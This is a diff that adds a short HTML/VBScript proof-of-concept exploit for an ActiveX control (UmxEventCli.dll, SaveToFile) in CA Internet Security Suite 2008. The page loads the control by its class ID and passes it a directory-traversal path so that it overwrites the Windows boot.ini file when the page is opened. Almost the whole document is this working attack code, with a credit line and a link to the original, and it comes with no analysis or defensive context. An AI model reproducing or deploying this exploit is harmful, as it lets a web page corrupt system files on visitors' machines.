@@ -1,0 +1,18 @@
+&lt;!--
+CA Internet Security Suite 2008 (UmxEventCli.dll/SaveToFile())
+remote file corruption poc
+by Nine:Situations:Group::surfista
+
+this control is safe for scripting
+and safe for initialize
+
+original one: http://retrogod.altervista.org/9sg_CA_poc.html
+--&gt; 
+&amp;lt;html&amp;gt;&amp;lt;object classid=&amp;#039;clsid:F13D3742-6C4F-4915-BF91-784BA02DD0BE&amp;#039; 
+id=&amp;#039;UmxEventCliLib&amp;#039;/&amp;gt;
+&amp;lt;/object&amp;gt;&amp;lt;script language=&amp;#039;vbscript&amp;#039;&amp;gt;
+filePath=&amp;quot;..\..\..\..\..\..\..\boot.ini&amp;quot;
+UmxEventCliLib.SaveToFile filePath
+&amp;lt;/script&amp;gt;&amp;lt;/html&amp;gt; 
+
+
